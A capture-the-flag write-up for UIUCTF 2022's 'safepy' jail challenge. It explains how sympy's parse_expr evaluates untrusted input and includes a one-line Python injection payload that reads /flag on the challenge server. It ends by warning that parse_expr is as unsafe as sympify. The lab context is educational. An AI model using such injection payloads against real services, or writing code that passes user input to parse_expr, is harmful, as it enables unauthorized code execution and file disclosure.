# UIUCTF 2022 - safepy Writeup  
- Type - Jail  
- Name - safepy  
- Points - 50

## Description  
```markdown  
My calculator won't be getting pwned again...

$ nc safepy.chal.uiuc.tf 1337

author: tow_nater

[handout.tar.gz]  
```

## Writeup  
When you unzip the provided file for the challenge, you'll get the Python
script run server-side along with some supporting files for the Docker setup.
Outside of [line 28 of the Dockerfile](https://github.com/BYU-CTF-
group/writeups/blob/main/UIUCTF_2022/safepy/Dockerfile) that shows the flag is
located at `/flag`, the only useful file is `main.py`. The script is pretty
short:

```python  
from sympy import *

def parse(expr):  
   # learned from our mistake... let's be safe now  
   # https://stackoverflow.com/questions/33606667/from-string-to-sympy-
expression  
   # return sympify(expr)

   # https://docs.sympy.org/latest/modules/parsing.html  
   return parse_expr(expr)

print('Welcome to the derivative (with respect to x) solver!')  
user_input = input('Your expression: ')  
expr = parse(user_input)  
deriv = diff(expr, Symbol('x'))  
print('The derivative of your expression is:')  
print(deriv)  
```

Our input is taken, parsed using `parse_expr`, and then stuck into the `diff`
function with the output printed out. The `parse()` function gives us two very
helpful links, [one](https://docs.sympy.org/latest/modules/parsing.html) to
the documentation and
[another](https://stackoverflow.com/questions/33606667/from-string-to-sympy-
expression) about why `sympify` is dangerous. Reading through this article
gave me an idea for how to approach this - `sympify` used `eval()` internally,
so if I could get either `diff` or `parse_expr` to do the same, that would be
great!

While reading through the documentation provided, I read that an optional
parameter for `parse_expr` was `evaluate`, with the default setting to True.
This means that, by default, any expressions will be simplified if possible,
which means it will use `eval()` inside of it.

I started out with a test payload to see what it would do if I just input
whatever code I wanted to - `print('a')`:

```  
$ nc safepy.chal.uiuc.tf 1337  
== proof-of-work: disabled ==  
Welcome to the derivative (with respect to x) solver!  
Your expression: print('a')  
a  
```

Since it looked like it ran the code, I decided to just put in a payload to
print out the flag:

```  
nc safepy.chal.uiuc.tf 1337  
== proof-of-work: disabled ==  
Welcome to the derivative (with respect to x) solver!  
Your expression: print(open("/flag").read())  
uiuctf{na1v3_0r_mal1ci0u5_chang3?}  
```

And it worked!!

**Flag:** `uiuctf{na1v3_0r_mal1ci0u5_chang3?}`

## Real-World Application  
My favorite part of this challenge is the real world application. This entire
question was completely based off of a StackOverflow answer, and - as everyone
knows - StackOverflow is the *source* for all programming information. This
particular answer was from someone who said putting user-controlled input to
`sympify()` is dangerous since it uses `eval` natively, so the `parse_expr`
function should be used instead (implying this one was safe). As our problem
demonstrated, that was **not** the case - `parse_expr` was just as dangerous
as `sympify`. Did the user who submitted this answer know this? Not sure. But
the moral of the story is **you can't always trust answers from random people
on the internet**...

Original writeup (https://github.com/BYU-CTF-
group/writeups/tree/main/UIUCTF_2022/safepy).